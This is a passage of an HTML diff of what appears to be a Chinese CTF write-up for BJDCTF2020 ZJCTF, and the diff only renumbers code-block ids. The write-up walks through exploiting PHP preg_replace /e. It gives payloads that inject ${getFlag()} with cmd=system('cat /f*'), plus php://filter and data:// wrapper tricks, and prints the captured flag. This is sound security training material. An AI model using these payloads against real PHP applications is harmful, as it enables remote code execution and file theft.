 <p><strong>所以我们要做的，就是把 <code>\1</code> 的位置变成 <code>${getFlag()}</code>。</strong></p>
 <h3 id="_1"><a class="toclink" href="../../bjdctf2020-zjctf/#_1">试错过程</a></h3>
 <p><strong>先试：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>/?.*=${phpinfo()}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>/?.*=${phpinfo()}
 </span></code></pre></div>
 <p><strong>页面无回显。</strong></p>
 <p><strong>原因：PHP 解析 URL 参数时会把参数名里的 <code>.</code> 和空格统一换成 <code>_</code>，所以 <code>.*</code> 变成了 <code>_*</code>，正则变成 <code>/(_*)/ei</code> —— 匹配不到 <code>${phpinfo()}</code>，所以没反应。</strong></p>
 <p><strong>换 <code>\S</code>（匹配任意非空白字符）代替 <code>.</code>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>/?\S*=${phpinfo()}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>/?\S*=${phpinfo()}
 </span></code></pre></div>
 <p><strong>成功得到回显。</strong></p>
 <div class="admonition note">
@@ -2543,28 +2705,28 @@
 <p><code>\s</code> = 空白字符 —— 写反了就匹配不到 <code>${phpinfo()}</code>。</p>
 </div>
 <h3 id="payload"><a class="toclink" href="../../bjdctf2020-zjctf/#payload">最终 payload</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>/next.php?\S*=${getFlag()}&amp;cmd=system('cat /f*');
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>/next.php?\S*=${getFlag()}&amp;cmd=system('cat /f*');
 </span></code></pre></div>
 <p><strong>注意最后要有分号</strong> —— <code>eval</code> 执行时需要 <code>;</code> 作为一条代码的结束。</p>
 <p><img alt="拿到 flag" src="../../../assets/images/bjdctf-zjctf/03-flag.png" /></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>CTF2{4497b560-3b8c-48c7-9991-bc1d0d9bce8c}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>CTF2{4497b560-3b8c-48c7-9991-bc1d0d9bce8c}
 </span></code></pre></div>
 <h3 id="cmd"><a class="toclink" href="../../bjdctf2020-zjctf/#cmd">为什么 <code>cmd</code> 末尾的分号不能省</a></h3>
 <p><code>getFlag()</code> 里是：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="x">@eval($_GET['cmd']);</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="x">@eval($_GET['cmd']);</span>
 </span></code></pre></div>
 <p>所以实际执行的是 <code>eval("system('cat /f*');")</code>。</p>
 <p><strong><code>eval</code> 把字符串当代码重新解析，必须是一条完整语句</strong>：</p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="x">eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'</span>
-</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="x">eval('echo "A";');   // ✅</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="x">eval('echo "A"');    // ❌ syntax error, unexpected end of file, expecting ';'</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="x">eval('echo "A";');   // ✅</span>
 </span></code></pre></div>
 <h3 id="_2"><a class="toclink" href="../../bjdctf2020-zjctf/#_2">完整链路</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
-</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a>② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
-</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a>③ 看懂 foreach:参数名=正则           $re
-</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a>④ /e 让替换串被 eval                 strtolower("\1")
-</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a>⑤ 用 \S* 当参数名(避开 . 被吃)       ?\S*=${phpinfo()}
-</span><span id="__span-63-6"><a id="__codelineno-63-6" name="__codelineno-63-6" href="#__codelineno-63-6"></a>⑥ 调 getFlag() 并带 cmd              ?\S*=${getFlag()}&amp;cmd=system('cat /f*');
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>① data:// 骗过 file_get_contents     text=data://text/plain,I have a dream
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>② php://filter 读源码(不执行)        file=php://filter/read=convert.base64-encode/resource=next.php
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a>③ 看懂 foreach:参数名=正则           $re
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a>④ /e 让替换串被 eval                 strtolower("\1")
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a>⑤ 用 \S* 当参数名(避开 . 被吃)       ?\S*=${phpinfo()}
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a>⑥ 调 getFlag() 并带 cmd              ?\S*=${getFlag()}&amp;cmd=system('cat /f*');
 </span></code></pre></div>
 <h3 id="_3"><a class="toclink" href="../../bjdctf2020-zjctf/#_3">知识点</a></h3>
 <table>
